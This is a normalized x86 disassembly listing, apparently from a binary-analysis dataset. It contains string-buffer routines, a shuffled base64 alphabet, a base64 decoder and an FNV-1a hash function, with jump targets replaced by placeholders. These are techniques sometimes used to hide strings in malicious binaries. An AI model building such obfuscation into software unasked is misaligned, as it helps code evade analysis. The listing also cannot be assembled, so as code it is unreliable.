sub eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
lea eax [ edx + ecx * 2 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
call sub_40bd00
add esp 0xc
mov edx [ ebp - 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40bff0
sub_40beb0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_40bc30
add esp 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40bf10
mov esp ebp
pop ebp
retn 0x8
sub_40bee0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_40bc30
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c110
mov esp ebp
pop ebp
retn 0x4
sub_40bf10
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
cmp eax [ edx + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ eax + 0x10 ]
ja r-xdata
mov eax [ r--data ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
sub ecx 0x1
mov edx [ ebp - 0x4 ]
sub edx ecx
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x8 ]
call sub_40c0d0
mov ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
call sub_40bcc0
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call sub_40bbf0
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
call sub_40c0d0
mov ecx [ ebp - 0xc ]
sub ecx eax
sar ecx 0x1
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
sar eax 0x1
add eax 0x1
mov ecx [ ebp - 0x4 ]
sub ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x2
mov [ ebp - 0x10 ] edx
sub_40bff0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
xor eax eax
mov [ ebp - 0x2 ] ax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] edx
lea eax [ ebp - 0x2 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bd30
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_40c030
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x8 ] ecx
movzx eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x14 ] 0x7
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_40bff0
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0x1 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_402160
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
push ecx
mov edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0x2 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_401d80
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
call sub_402180
add esp 0x4
push eax
mov edx [ ebp - 0x8 ]
push edx
call sub_40bc90
add esp 0xc
sub_40c0d0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call sub_402180
add esp 0x4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40c110
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c2f0
movzx ecx al
test ecx ecx
je r-xdata
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c240
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
sub ecx eax
sar ecx 0x1
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c190
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
push eax
call sub_40bc90
add esp 0xc
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40bff0
mov esp ebp
pop ebp
retn 0x8
sub_40c190
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_401890
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
call sub_401890
sub eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
push 0x0
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c240
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c330
mov ecx [ ebp + 0xc ]
push ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40be00
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40c0d0
mov edx [ ebp + 0xc ]
lea eax [ eax + edx * 2 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
push eax
call sub_40bc90
add esp 0xc
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40bff0
sub_40c240
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40c360
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c3a0
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x8
jae r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40bff0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0x10 ]
jae r-xdata
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov al [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x8 ]
push edx
push 0x1
mov ecx [ ebp - 0x4 ]
call sub_40c030
jmp r-xdata
sub_40c2f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
cmp [ ebp + 0x8 ] eax
jb r-xdata
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + edx * 2 ]
cmp eax [ ebp + 0x8 ]
ja r-xdata
mov al 0x1
sub_40c330
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40bff0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
call sub_401d20
sub_40c360
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_401a60
mov ecx eax
call sub_40c590
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x1
ja r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_40c3a0
push ebp
mov ebp esp
push 0xffffffff
push sub_43b090
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x8 ]
or eax 0x7
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x1c ]
call sub_40c360
cmp eax [ ebp - 0x20 ]
jae r-xdata
mov eax [ ebp - 0x20 ]
xor edx edx
mov ecx 0x3
div ecx
mov edx [ ebp - 0x1c ]
mov ecx [ edx + 0x14 ]
shr ecx 0x1
cmp ecx eax
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov esi [ edx + 0x14 ]
shr esi 0x1
mov ecx [ ebp - 0x1c ]
call sub_40c360
sub eax esi
mov ecx [ ebp - 0x1c ]
cmp [ ecx + 0x14 ] eax
ja r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x21 ]
push edx
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
push eax
mov ecx [ ebp - 0x28 ]
call sub_40c570
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
call sub_40c360
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x1c ]
mov eax [ edx + 0x14 ]
shr eax 0x1
mov ecx [ ebp - 0x1c ]
add eax [ ecx + 0x14 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push 0x0
push 0x1
mov ecx [ ebp - 0x1c ]
call sub_40c030
lea edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x23 ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov ecx eax
call sub_402130
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
mov [ edx + 0x14 ] eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_40bff0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_40c0d0
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_40bc90
add esp 0xc
sub_40c472
mov [ ebp - 0x10 ] esp
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x22 ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x1
push ecx
mov ecx [ ebp - 0x2c ]
call sub_40c570
mov [ ebp - 0x34 ] eax
mov edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax r-xdata
retn
sub_40c5f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
jmp r-xdata
call sub_4215c5
mov eax [ ebp + 0x8 ]
shl eax 0x1
push eax
call sub_42257f
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40c630
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x41
jmp r-xdata
cmp [ ebp - 0x8 ] 0x4b
jg r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + rw-data ] 0x2b
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x61
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov dl [ ebp - 0x8 ]
mov [ ecx + rw-data ] dl
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x6b
jg r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + rw-data ] 0x2f
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x10 ] 0x30
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov dl [ ebp - 0xc ]
mov [ ecx + rw-data ] dl
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x39
jg r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] 0x6c
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov dl [ ebp - 0x10 ]
mov [ ecx + rw-data ] dl
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x14 ] 0x7a
jg r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x18 ] 0x4c
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov al [ ebp - 0x14 ]
mov [ edx + rw-data ] al
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x5a
jg r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x1c ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov cl [ ebp - 0x18 ]
mov [ eax + rw-data ] cl
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
sub_40c760
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
movsx eax [ ebp + 0x8 ]
push eax
push rw-data
call sub_40c990
add esp 0x8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
sub eax rw-data
mov esp ebp
pop ebp
retn 0x4
sub_40c790
push ebp
mov ebp esp
sub esp 0x28
push esi
mov [ ebp - 0x28 ] ecx
mov eax [ ebp + 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
imul eax eax 0x3
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
movsx ecx [ eax - 0x1 ]
cmp ecx 0x3d
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
movsx ecx [ eax - 0x2 ]
cmp ecx 0x3d
jne r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
movsx ecx [ eax - 0x3 ]
cmp ecx 0x3d
jne r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x3
ja r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x4 ]
push eax
call sub_42276a
add esp 0x4
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x24 ]
jmp [ ecx * 4 + jump_table_40c97c ]
mov ecx [ ebp - 0x4 ]
push ecx
push 0x0
mov edx [ ebp - 0x20 ]
push edx
call sub_427900
add esp 0xc
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
push r--data
call sub_423366
add esp 0x4
push 0x0
call sub_4237a0
mov edx [ ebp - 0x4 ]
add edx 0x4
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x3
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x2
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x1c ]
mov [ edx ] 0x0
mov eax [ ebp - 0x20 ]
pop esi
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] 0x0
mov ecx 0x4
sub ecx [ ebp - 0xc ]
imul ecx ecx 0x6
mov edx [ ebp - 0x14 ]
shl edx cl
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp + 0xc ]
sub edx [ ebp - 0x8 ]
cmp [ ebp - 0x18 ] edx
jl r-xdata
cmp [ ebp - 0x10 ] 0x3
jge r-xdata
mov esi [ ebp - 0x14 ]
shl esi 0x6
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x18 ]
movzx ecx [ eax ]
push ecx
mov ecx [ ebp - 0x28 ]
call sub_40c760
movsx edx al
or esi edx
mov [ ebp - 0x14 ] esi
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0xc ] 0x4
jge r-xdata
mov ecx [ ebp + 0xc ]
sub ecx [ ebp - 0x8 ]
cmp [ ebp - 0x18 ] ecx
jge r-xdata
mov ecx 0x2
sub ecx [ ebp - 0x10 ]
shl ecx 0x3
mov edx [ ebp - 0x14 ]
sar edx cl
and edx 0xff
mov eax [ ebp - 0x1c ]
mov [ eax ] dl
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
sub_40c9b0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0xc ] 0x811c9dc5
mov [ ebp - 0x10 ] 0x1000193
mov [ ebp - 0x4 ] 0x811c9dc5
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
movzx eax [ edx ]
xor eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
imul ecx ecx 0x1000193
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
sub_40ca10
push ebp
mov ebp esp
sub esp 0x8
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_427d98
add esp 0xc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40ca50
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_423ae0
add esp 0xc
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40cad0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40cb00
push ebp
mov ebp esp
sub esp 0x8
call sub_40cb50
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] eax
je r-xdata
call sub_40cb50
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
sub_40cbe0
push ebp
mov ebp esp
push 0xffffffff
push sub_43b948
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ edx ] eax
push 0x3
lea ecx [ ebp - 0x14 ]
call sub_42168a
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x18 ]
call sub_40cb60
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_4216e6
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_40cc70
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40ccb0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_401870
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_42392e
mov ecx [ ebp - 0x4 ]
mov [ ecx ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_40ccf0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_42392e
mov ecx [ ebp - 0x4 ]
mov [ ecx ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_40cd20
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40cd50
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_40cd70
push ebp
mov ebp esp
push 0xffffffff
push sub_43b52a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
push 0x0
mov ecx [ ebp - 0x10 ]
call sub_42168a
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x4
call sub_4102c0
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x10 ]
add ecx 0xc
call sub_4102c0
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x10 ]
add ecx 0x14
call sub_410330
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
call sub_410330
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x10 ]
add ecx 0x24
call sub_4102c0
mov [ ebp - 0x4 ] 0x5
mov ecx [ ebp - 0x10 ]
add ecx 0x2c
call sub_4102c0
mov [ ebp - 0x4 ] 0x6
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
call sub_421921
add esp 0x8
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
push r--data
lea ecx [ ebp - 0x1c ]
call sub_40ccf0
push r--data
lea eax [ ebp - 0x1c ]
push eax
call sub_42569b
sub_40ce50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call sub_42196c
add esp 0x4
mov ecx [ ebp - 0x4 ]
add ecx 0x2c
call sub_4102e0
mov ecx [ ebp - 0x4 ]
add ecx 0x24
call sub_4102e0
mov ecx [ ebp - 0x4 ]
add ecx 0x1c
call sub_4102e0
mov ecx [ ebp - 0x4 ]
add ecx 0x14
call sub_4102e0
mov ecx [ ebp - 0x4 ]
add ecx 0xc
call sub_4102e0
mov ecx [ ebp - 0x4 ]
add ecx 0x4
call sub_4102e0
mov ecx [ ebp - 0x4 ]
call sub_4216e6
mov esp ebp
pop ebp
retn
sub_40cec0
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x24 ]
push eax
call sub_421a16
add esp 0x4
mov ecx [ eax ]
